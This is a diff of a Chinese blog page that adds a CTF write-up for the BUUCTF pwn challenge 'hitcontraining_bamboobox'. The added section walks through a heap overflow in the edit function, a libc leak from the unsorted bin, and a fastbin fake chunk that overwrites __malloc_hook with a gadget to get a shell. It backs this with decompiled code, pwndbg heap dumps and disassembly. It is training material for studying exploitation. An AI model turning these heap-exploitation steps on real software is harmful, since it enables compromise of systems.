@@ -442,21 +442,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-29
+                    2023-11-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.7k
+                    5.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    26 分
+                    30 分
                 </div>
                 
 
@@ -1434,6 +1434,146 @@ get<span class="token punctuation">(</span><span class="token number">0x7</span>
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#hitcontraining_bamboobox">hitcontraining_bamboobox</a></h2><p>检查保护：没有开地址随机化</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  bamboobox  checksec pwn
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/bamboobox/pwn'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x3fc000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>分析程序：</p>
+<p>这是一道<code>2.23-0ubuntu11</code>的堆题，<code>libc 2.23</code>中在任意地址写的时候限制写的地址所识别的‘堆’大小与创建大小一致</p>
+<p>存后门函数实现<code>orw</code>，但是<code>buuctf</code>的远程文件路径大概率不是这个</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __noreturn <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-74h]</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-70h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-8h]</span>
+
+  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/bamboobox/flag"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其他函数主要就是堆的增删改查，<code>bss</code>段存在堆管理，漏洞点出在<code>edit</code>函数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 change_item()
+&#123;
+  int v1; &#x2F;&#x2F; [rsp+4h] [rbp-2Ch]
+  int v2; &#x2F;&#x2F; [rsp+8h] [rbp-28h]
+  char buf[16]; &#x2F;&#x2F; [rsp+10h] [rbp-20h] BYREF
+  char nptr[8]; &#x2F;&#x2F; [rsp+20h] [rbp-10h] BYREF
+  unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rbp-8h]
+
+  v5 &#x3D; __readfsqword(0x28u);
+  if ( num )
+  &#123;
+    printf(&quot;Please enter the index of item:&quot;);
+    read(0, buf, 8uLL);
+    v1 &#x3D; atoi(buf);
+    if ( *(_QWORD *)&amp;itemlist[4 * v1 + 2] )
+    &#123;
+      printf(&quot;Please enter the length of item name:&quot;);&#x2F;&#x2F; vuln
+      read(0, nptr, 8uLL);
+      v2 &#x3D; atoi(nptr);
+      printf(&quot;Please enter the new name of the item:&quot;);
+      *(_BYTE *)(*(_QWORD *)&amp;itemlist[4 * v1 + 2] + (int)read(0, *(void **)&amp;itemlist[4 * v1 + 2], v2)) &#x3D; 0;
+    &#125;
+    else
+    &#123;
+      puts(&quot;invaild index&quot;);
+    &#125;
+  &#125;
+  else
+  &#123;
+    puts(&quot;No item in the box&quot;);
+  &#125;
+  return __readfsqword(0x28u) ^ v5;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在原先创建堆的时候就已经创建好一定大小的堆了，<code>edit</code>功能中还可以控制输入长度，因此可以造成堆溢出，接下来就是构造堆来泄露<code>libc</code>并改<code>__malloc_hook</code>了</p>
+<p>泄露<code>libc</code>：<code>printf</code>输出的时候会被<code>\x00</code>截断，而且程序控制输入值的最后一位改成<code>0</code>，所以不能通过控制输入值覆盖掉<code>\x00</code>来输出<code>libc</code></p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">*(_BYTE *)(*(_QWORD *)&amp;itemlist[4 * v1 + 2] + (int)read(0, *(void **)&amp;itemlist[4 * v1 + 2], v2)) &#x3D; 0;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>首先创建三个堆，其中第一个堆用于修改第二个堆的大小，第二个堆用于覆盖第三个堆，其中第二个堆和第三个堆的大小之和要大于<code>unsorted bin</code>的大小</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
+Allocated chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x603020
+Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>
+
+Allocated chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x603040
+Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>
+
+Allocated chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x603060
+Size: 0xa0 <span class="token punctuation">(</span>with flag bits: 0xa1<span class="token punctuation">)</span>
+
+Top chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x603100
+Size: 0x20d60 <span class="token punctuation">(</span>with flag bits: 0x20d61<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来用第一个堆改变第二个堆去覆盖第三个堆，释放第二个堆之后在<code>fd</code>和<code>bk</code>的位置中存在<code>libc</code>地址</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
+Allocated chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x603020
+Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>
+
+Free chunk <span class="token punctuation">(</span>unsortedbin<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x603040
+Size: 0xc0 <span class="token punctuation">(</span>with flag bits: 0xc1<span class="token punctuation">)</span>
+fd: 0x7ffff7dd1b78
+bk: 0x7ffff7dd1b78
+
+<span class="token punctuation">..</span>.
+
+Top chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x603200
+Size: 0x20c60 <span class="token punctuation">(</span>with flag bits: 0x20c61<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时创建一个堆将从<code>unsorted bin</code>中切割，切割之后<code>libc</code>会落在剩余的<code>unsorted bin</code>的堆中，控制创建的堆大小使得<code>libc</code>恰好落在第三个堆的<code>fd</code>位置，控制创建的堆大小为<code>0x18</code>时<code>libc</code>恰好会落在第三个堆上并且第三个堆仍然存在没有被释放，此时使用<code>show</code>功能即可获取<code>libc</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0x603020
+0x603020:	0x0000000000000000	0x0000000000000021
+0x603030:	0x6161616161616161	0x6161616161616161
+0x603040:	0x6161616161616161	0x0000000000000021
+0x603050:	0x00007ffff7dd0062	0x00007ffff7dd1c28
+0x603060:	0x6161616161616161	0x00000000000000a1
+0x603070:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
+0x603080:	0x6161616161616161	0x6161616161616161
+0x603090:	0x6161616161616161	0x6161616161616161
+0x6030a0:	0x6161616161616161	0x6161616161616161
+0x6030b0:	0x6161616161616161	0x6161616161616161<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来利用<code>fast bin</code>实现任意地址写，将<code>__malloc_hook</code>改为<code>gadget</code>，需要注意的是不能直接将<code>fd</code>改成<code>__malloc_hook</code>，而要利用<code>find_fake_chunk</code>找到合适的<code>fake_chunk</code>来间接修改<code>__malloc_hook</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> bin
+fastbins
+0x70: 0x603190 —▸ 0x7ffff7dd1aed ◂— 0xfff7a92e20000000
+unsortedbin
+all: 0x603060 —▸ 0x7ffff7dd1b78 ◂— 0x603060 /* <span class="token string">'`0`'</span> */
+smallbins
+empty
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后释放<code>fake chunk</code>会调用<code>munmap_chunk</code>，释放的时候会报非法地址的错误，最后会调用<code>__malloc_hook，</code>实现<code>getshell</code></p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff7afd2a4    mov    rax, qword ptr [rip + 0x2d3c0d]
+   0x7ffff7afd2ab    lea    rsi, [rsp + 0x50]
+   0x7ffff7afd2b0    lea    rdi, [rip + 0x9caa0]
+   0x7ffff7afd2b7    mov    rdx, qword ptr [rax]
+   0x7ffff7afd2ba    call   execve                &lt;execve&gt;
+ 
+   0x7ffff7afd2bf    call   abort                &lt;abort&gt;
+ 
+   0x7ffff7afd2c4    lea    rax, [rip + 0x9ca8c]
+   0x7ffff7afd2cb    mov    qword ptr [rsp + 0x68], 0
+   0x7ffff7afd2d4    mov    qword ptr [rsp + 0x50], rax
+   0x7ffff7afd2d9    mov    rax, qword ptr [rsp + 0x20]
+   0x7ffff7afd2de    mov    qword ptr [rsp + 0x60], rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -1779,7 +1919,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">52.1k</span>&nbsp;字
+                class="white-color">53.1k</span>&nbsp;字
             
             
             
